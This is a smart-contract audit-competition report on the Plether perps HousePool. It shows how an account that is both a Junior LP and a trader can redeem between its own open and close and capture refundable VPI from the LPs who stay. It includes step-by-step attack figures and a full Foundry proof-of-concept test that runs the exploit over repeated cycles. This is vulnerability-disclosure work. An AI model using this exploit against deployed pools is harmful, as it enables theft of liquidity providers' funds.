# \#98711 [SC-Critical] Junior LP redeeming between its own open and close captures the refundable VPI from the Junior LPs who stay (remaining LP redeems below its deposit at an unchanged price)

**Submitted on Nov 9th 2026 at 18:44:03 UTC by @Tekmer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98711
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays VPI into the HousePool. The engine records that cash as `ClaimantInflowKind.Revenue`, the next reconcile adds it to Junior principal, and LP epoch settlement prices Junior redemptions at that principal. But the same VPI is not earned: the close-side lifetime clamp returns up to the full accrued VPI to the same account when it reduces skew, and the rebate is paid from pool cash. Nothing in redemption pricing or the withdrawal reserve accounts for VPI that is still refundable to an open position.

So an account that is both a Junior LP and a trader can (1) queue a redemption, (2) open a skew-increasing position just before the epoch boundary, (3) redeem at a Junior NAV that already counts the VPI, and (4) close and take the VPI back. The rebate then comes out of the Junior LPs who did not redeem. At an unchanged price, with every fee paid, the attacker profits and the remaining Junior LP redeems below its deposit. The project's own clamp comment says it exists to prevent "LP sandwich attacks", but it bounds only the trader-side rebate. It does not cover the LP-side exit between the two legs.

## Root cause (a82d4fef, packages/perps/src)

- `CfdEngineSettlementSidecar.sol:454-463`: open trade cost (VPI) is recorded as `ClaimantInflowKind.Revenue`, cash arrived.
- `HousePool.sol:624-651` (`recordClaimantInflow`): adds it to `accountedAssets`; with nonzero principals it is not held pending.
- `HousePool.sol:1555` (`_reconcile`) and `HousePoolWaterfallAccountingLib.sol:140-159` (`distributeRevenue`): the surplus is routed to Junior principal.
- `HousePool.sol:835-841` (`_settleLpEpoch`): reconciles, then prices Junior redemptions at `juniorPrincipal`.
- `CloseAccountingLib.sol:103-117`: close VPI is the curve delta, clamped so lifetime VPI is not negative, i.e. the account is rebated up to everything it paid.
- `CfdEnginePlanLib.sol:972-977`: the rebate is paid from free pool cash.
- `HousePoolAccountingLib.sol:46-55` (`buildWithdrawalSnapshot`): reserves max liability, claims and supplemental headroom only; refundable positive VPI on open positions is neither reserved nor deducted from redemption NAV.

## Attack steps (release parameters; every caller is an ordinary EOA)

1. Pool: Junior 10M (attacker 8M, victim 2M), Senior 8M. The attacker's Junior shares are past the one-hour cooldown.
2. Before the five-minute cutoff, the attacker's LP account calls `juniorVault.requestRedeem(allShares)` for the next epoch.
3. Two minutes before the boundary, the attacker's trader account commits a LONG at 39% of net depth (7.02M notional, inside the 40% skew cap) and any keeper executes it. VPI paid: 13,689.00 USDG. Pending Junior principal rises by the same amount.
4. At the boundary, any keeper calls `OrderRouter.settleLpEpoch(pythUpdate)`. The attacker's 8M Junior is funded at 8,010,834.30 USDG (it includes 80% of the VPI) and claimed.
5. The trader account closes at the same price. The clamp rebates the 13,689 VPI from pool cash.
6. Result: attacker +5,285.77 USDG net of both execution fees (2 x 2,808) and carry. The victim later redeems 1,991,755.05 USDG: -8,227.91 against its value before the open and -8,244.95 against its 2,000,000 deposit. Control: the same trades without step 2 leave the victim at +536.99.
7. Repeat: re-deposit, activate at the next boundary, wait out the cooldown, and run steps 2-6 again (a 3 h cycle). The PoC runs 3 cycles: attacker +14,145.82, victim -21,984.02.

Bound per cycle: the VPI of an open from zero skew to S is `k S^2 / (2D)`. With S <= 0.4 D this is at most 8 bps of depth, and the extracted share is the attacker's fraction of Junior. It is profitable once that fraction is above about `2 x fee / VPI`, which is about 41% at full skew, and it scales linearly with pool size. Honest LPs who redeem while skew-increasing positions are open capture the same refundable VPI from the LPs who stay.

## Impact

Direct theft of user funds: the remaining Junior LP redeems below its own deposit at an unchanged price (principal, not yield: its loss is about three times its own share of the VPI), and the attacker keeps a net profit after every fee and carry. Capital size is not a downgrade reason under the program's feasibility rules.

## Recommendation

Treat positive accrued VPI on open positions as a liability until the position's close or liquidation realises it. Either hold it in a pending bucket outside distributable Junior principal, or deduct the aggregate refundable VPI (sum of `max(vpiAccrued, 0)` on open positions) from redemption and deposit pricing.

## Proof of Concept

File: `packages/perps/test/lp/VpiRefundCapturedByRedeemingLp.t.sol` (new file, full source below). It builds on the repo's `test/perps/BasePerpTest.sol` and uses release risk parameters plus the documented 72 h owner proposals (Senior 40M / 8000 bps, min open 1,000 USDG, adverse multiplier 2,500). It does not modify any in-scope contract and does not prank any in-scope contract address. Pyth and USDG are the repo mocks. Orders go through the production V3 `OrderRouter.commitOrder(OrderRequest)` and keeper `executeOrder`. LP settlement goes through the permissionless `OrderRouter.settleLpEpoch(bytes[])`.

Run from `packages/perps`:

```
FOUNDRY_TEST=test/lp forge test --offline --skip script --match-path 'test/lp/*' -vv
```

Expected: `test_redeemingLpCapturesRefundableVpi`, `test_controlWithoutRedemption`, and (6M Senior variant) `test_repeatsEveryCycle` all PASS, with the numbers in the description in the logs (attacker net 5285766735, victim -8227906138 vs value before the open and -8244953325 vs deposit; control victim +536994819; three cycles attacker 14145818012, victim -21984018816, in USDG atoms).

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// VPI charged on a skew-increasing open is booked into Junior NAV immediately, although the same account is rebated
// that VPI (lifetime clamp) when it closes. A Junior LP who is also that trader redeems at the inflated NAV between the
// open and the close; the rebate is then paid from pool cash and borne entirely by the Junior LPs who stayed.
//
// Every action goes through public entry points as an ordinary EOA (trader, LP, keeper). The only owner actions are the
// documented 72 h configuration proposals that install the Arbitrum Sepolia v2.0.0 release values. No in-scope
// contract address is pranked. Pyth and USDG are the repo's mocks.

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

contract VpiRefundCapturedByRedeemingLpTest is BasePerpTest {

    address internal victimLp = address(0x1A11);
    address internal seniorLp = address(0xA11CE);
    address internal attackerLp = address(0xA77A);
    address internal attackerTrader = address(0xA77B);
    address internal keeper = address(0x4EE9);

    // Monday 2024-03-11 00:30 UTC: FX market open, outside the Friday FAD window.
    uint256 internal constant START = 1_710_117_000;
    uint256 internal constant PRICE = 1e8;

    uint256 internal constant VICTIM_JUNIOR = 2_000_000e6;
    uint256 internal constant ATTACKER_JUNIOR = 8_000_000e6;
    uint256 internal constant SENIOR = 8_000_000e6;
    uint256 internal constant TRADER_COLLATERAL = 200_000e6;

    // --- Arbitrum Sepolia v2.0.0 release economics (manifest "economics") ---

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _seniorDeposit() internal pure virtual returns (uint256) {
        return SENIOR;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        // Owner's documented 72 h configuration path: release senior cap/share, opening minimum, adverse multiplier.
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1000e6;
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(pool.seniorRateBps(), 800, "release senior rate");
        if (vm.getBlockTimestamp() < START) {
            vm.warp(START);
        }

        // LP deposits through the asynchronous vault flow; a keeper activates them at the epoch boundary.
        // Junior first: Senior admission is capped at 80% of the activated pool (maxSeniorShareBps 8000).
        uint256 r1 = _requestDeposit(juniorVault, victimLp, VICTIM_JUNIOR);
        uint256 r2 = _requestDeposit(juniorVault, attackerLp, ATTACKER_JUNIOR);
        vm.warp(juniorVault.depositEpochStart(r1));
        _keeperSettle();
        _claimDeposit(juniorVault, victimLp, r1);
        _claimDeposit(juniorVault, attackerLp, r2);
        uint256 r3 = _requestDeposit(seniorVault, seniorLp, _seniorDeposit());
        vm.warp(seniorVault.depositEpochStart(r3));
        _keeperSettle();
        _claimDeposit(seniorVault, seniorLp, r3);

        settlementToken.mint(attackerTrader, TRADER_COLLATERAL);
        vm.startPrank(attackerTrader);
        settlementToken.approve(address(clearinghouse), TRADER_COLLATERAL);
        clearinghouse.deposit(attackerTrader, TRADER_COLLATERAL);
        vm.stopPrank();

        // Past the one-hour post-activation cooldown, at 10 minutes into an epoch.
        vm.warp((vm.getBlockTimestamp() / 3600 + 1) * 3600 + 600);
        _keeperRefresh();
    }

    // ------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------

    /// Attack: request redemption, open a skew-increasing position just before the epoch boundary, let the epoch
    /// settle, claim, close. The remaining Junior LP then redeems below its deposit at an unchanged price.
    function test_redeemingLpCapturesRefundableVpi() public {
        Outcome memory o = _run(true);
        assertGt(o.vpiCharged, 0, "open paid VPI");
        // The rebate is the lifetime clamp: exactly the VPI this account paid, never more (less ~2 min carry here).
        assertLe(o.vpiRebated, o.vpiCharged, "rebate never exceeds the VPI charged at open");
        assertApproxEqAbs(o.vpiRebated, o.vpiCharged, 1e6, "close rebated the VPI charged at open");
        assertGt(o.attackerNet, 0, "attacker net profit after every fee and carry");
        assertLt(o.victimProceeds + 5_000e6, o.victimStart, "remaining Junior LP loses > 5,000 USDG at an unchanged price");
        assertLt(o.victimProceeds, VICTIM_JUNIOR, "remaining Junior LP redeems below its deposit");
    }

    /// Control: identical trades and timing, but the attacker's LP leg does not redeem. The victim is not harmed.
    function test_controlWithoutRedemption() public {
        Outcome memory o = _run(false);
        // Here depth at close is 18M + the VPI just collected, so the curve rebate is ~11 USDG below the charge.
        assertApproxEqAbs(o.vpiRebated, o.vpiCharged, 15e6, "close rebated the VPI charged at open (curve value)");
        assertGe(o.victimProceeds, o.victimStart, "without the mid-trade redemption the Junior LP loses nothing");
    }

    // ------------------------------------------------------------------
    // Scenario
    // ------------------------------------------------------------------

    struct Outcome {
        uint256 vpiCharged;
        uint256 vpiRebated;
        int256 attackerNet;
        uint256 victimProceeds;
        uint256 victimStart;
        uint256 attackerSharesRedeemed;
    }

    function _run(
        bool attackerRedeems
    ) internal returns (Outcome memory o) {
        o.victimStart = _juniorValue(victimLp);
        _cycle(attackerRedeems, o);
        _victimExit(o);
    }

    /// One attack cycle (steps 1-4). Fills the VPI and attacker fields of `o`.
    function _cycle(
        bool attackerRedeems,
        Outcome memory o
    ) internal {
        uint256 attackerStart = _attackerValue();
        uint256 treasuryStart = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        console2.log("pool assets", pool.totalAssets());
        console2.log("junior principal", pool.juniorPrincipal(), "senior principal", pool.seniorPrincipal());

        uint256 boundary = (vm.getBlockTimestamp() / 3600 + 1) * 3600;

        // 1. LP leg: queue a redemption of every Junior share for the next epoch (before the 5-minute cutoff).
        uint256 redeemRequest;
        if (attackerRedeems) {
            uint256 shares = juniorVault.balanceOf(attackerLp);
            o.attackerSharesRedeemed = shares;
            vm.prank(attackerLp);
            redeemRequest = juniorVault.requestRedeem(shares, attackerLp, attackerLp);
            assertEq(juniorVault.depositEpochStart(redeemRequest), boundary, "redemption matures at the next boundary");
        }

        // 2. Trader leg: two minutes before the boundary, open LONG at 39% of net depth (inside the 40% skew cap).
        vm.warp(boundary - 120);
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 size = ((depth * 39 / 100) / PRICE) * CfdTypes.SIZE_QUANTUM;
        uint256 notional = size / CfdTypes.SIZE_QUANTUM * PRICE;
        uint256 traderBefore = clearinghouse.balanceAssets(attackerTrader);
        (, uint256 juniorBeforeOpen) = pool.getPendingDepositTrancheState();
        _trade(attackerTrader, CfdTypes.Side.LONG, size, notional / 100, false);
        (,,,,,, int256 vpiAccrued) = engine.positions(attackerTrader);
        o.vpiCharged = SafeCast.toUint256(vpiAccrued);
        (, uint256 juniorAfterOpen) = pool.getPendingDepositTrancheState();
        console2.log("notional", notional, "VPI charged at open", o.vpiCharged);
        console2.log("pending junior principal before/after open", juniorBeforeOpen, juniorAfterOpen);

        // 3. Epoch boundary: any keeper settles the matured epoch through the Router; the attacker claims.
        vm.warp(boundary);
        if (attackerRedeems) {
            uint256 juniorBeforeSettle = pool.juniorPrincipal();
            _keeperSettle();
            console2.log("junior principal before/after settlement", juniorBeforeSettle, pool.juniorPrincipal());
            uint256 claimable = juniorVault.claimableRedeemRequest(redeemRequest, attackerLp);
            assertEq(claimable, o.attackerSharesRedeemed, "attacker redemption fully funded");
            vm.prank(attackerLp);
            juniorVault.claimRedeem(redeemRequest, claimable, attackerLp, attackerLp);
            console2.log("attacker LP received", settlementToken.balanceOf(attackerLp));
        }

        // 4. Trader leg closes at the same price; the lifetime clamp returns the VPI charged at open.
        uint256 traderBeforeClose = clearinghouse.balanceAssets(attackerTrader);
        _trade(attackerTrader, CfdTypes.Side.LONG, size, 0, true);
        uint256 traderAfterClose = clearinghouse.balanceAssets(attackerTrader);
        uint256 closeFee = notional * engine.executionFeeBps() / 10_000;
        // Close at an unchanged price: balance change = rebate - execution fee - carry (about two minutes).
        o.vpiRebated = traderAfterClose + closeFee - traderBeforeClose;
        console2.log("trader balance: before open / before close / after close");
        console2.log(traderBefore, traderBeforeClose, traderAfterClose);

        o.attackerNet = int256(_attackerValue()) - int256(attackerStart);
        console2.log("attacker net (USDG atoms, LP + trader legs, after fees and carry)");
        console2.logInt(o.attackerNet);
        console2.log("treasury fees", clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasuryStart);

    }

    /// Step 5: the remaining Junior LP redeems everything in the next epoch at the same price.
    function _victimExit(
        Outcome memory o
    ) internal {
        // 5. The remaining Junior LP redeems everything in the next epoch at the same price. The Senior LP exits in the
        //    same epoch so that the Junior withdrawal-ratio cap (Senior <= 80%) does not hold the victim's request back.
        uint256 seniorShares = seniorVault.balanceOf(seniorLp);
        vm.prank(seniorLp);
        seniorVault.requestRedeem(seniorShares, seniorLp, seniorLp);
        uint256 victimShares = juniorVault.balanceOf(victimLp);
        vm.prank(victimLp);
        uint256 victimRequest = juniorVault.requestRedeem(victimShares, victimLp, victimLp);
        vm.warp(juniorVault.depositEpochStart(victimRequest));
        _keeperSettle();
        uint256 victimClaimable = juniorVault.claimableRedeemRequest(victimRequest, victimLp);
        assertEq(victimClaimable, victimShares, "victim redemption fully funded");
        vm.prank(victimLp);
        juniorVault.claimRedeem(victimRequest, victimClaimable, victimLp, victimLp);
        o.victimProceeds = settlementToken.balanceOf(victimLp);
        console2.log("victim deposited / value before the open / redeemed", VICTIM_JUNIOR, o.victimStart, o.victimProceeds);
        console2.log("victim change vs value before the open, and vs deposit");
        console2.logInt(int256(o.victimProceeds) - int256(o.victimStart));
        console2.logInt(int256(o.victimProceeds) - int256(VICTIM_JUNIOR));
    }

    // ------------------------------------------------------------------
    // Helpers: every call is an ordinary EOA through a public entry point
    // ------------------------------------------------------------------

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        uint256 supply = juniorVault.totalSupply();
        (, uint256 junior) = pool.getPendingDepositTrancheState();
        return supply == 0 ? 0 : junior * juniorVault.balanceOf(lp) / supply;
    }

    function _attackerValue() internal view returns (uint256) {
        return settlementToken.balanceOf(attackerLp) + clearinghouse.balanceAssets(attackerTrader) + _juniorValue(attackerLp);
    }

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _pythLive() internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        baseMockPyth.setAllPrices(
            _basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(PRICE)), 0, int32(-8), vm.getBlockTimestamp()
        );
        data = new bytes[](1);
        data[0] = abi.encode(PRICE);
    }

    function _keeperRefresh() internal {
        bytes[] memory data = _pythLive();
        vm.prank(keeper);
        router.updateMarkPrice(data);
    }

    function _keeperSettle() internal {
        bytes[] memory data = _pythLive();
        vm.prank(keeper);
        router.settleLpEpoch(data);
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        _keeperRefresh();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, vm.getBlockTimestamp(), isClose)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        uint64 id = OrderRouter(address(router)).commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(PRICE);
        vm.prank(keeper);
        router.executeOrder(id, data);
        assertEq(router.nextExecuteId(), 0, "order executed");
    }

}

/// Same scenario with a 6M Senior tranche (75% Senior), so the Junior withdrawal-ratio floor (Senior <= 80%) never
/// holds back the attacker's full exit across several cycles while the victim's Junior value shrinks.
contract VpiRefundCapturedRepeatedlyTest is VpiRefundCapturedByRedeemingLpTest {

    function _seniorDeposit() internal pure override returns (uint256) {
        return 6_000_000e6;
    }

    /// Repetition: the attacker re-enters Junior after each exit (activation, then the one-hour cooldown) and repeats.
    /// Each three-hour cycle takes a similar amount from the Junior LP who stays.
    function test_repeatsEveryCycle() public {
        Outcome memory o;
        o.victimStart = _juniorValue(victimLp);
        int256 attackerTotal;
        for (uint256 i = 0; i < 3; i++) {
            _cycle(true, o);
            attackerTotal += o.attackerNet;
            console2.log("cycle", i, "victim Junior value", _juniorValue(victimLp));
            // Re-enter: deposit the redeemed USDG, activate at the next boundary, wait out the cooldown.
            uint256 amount = settlementToken.balanceOf(attackerLp);
            vm.startPrank(attackerLp);
            settlementToken.approve(address(juniorVault), amount);
            uint256 requestId = juniorVault.requestDeposit(amount, attackerLp, attackerLp);
            vm.stopPrank();
            vm.warp(juniorVault.depositEpochStart(requestId));
            _keeperSettle();
            _claimDeposit(juniorVault, attackerLp, requestId);
            vm.warp((vm.getBlockTimestamp() / 3600 + 1) * 3600 + 600);
        }
        console2.log("attacker net over three cycles");
        console2.logInt(attackerTotal);
        _victimExit(o);
        assertGt(attackerTotal, 0, "attacker profits across cycles");
        assertLt(o.victimProceeds + 20_000e6, o.victimStart, "victim loses > 20,000 USDG over three cycles");
    }

}
```
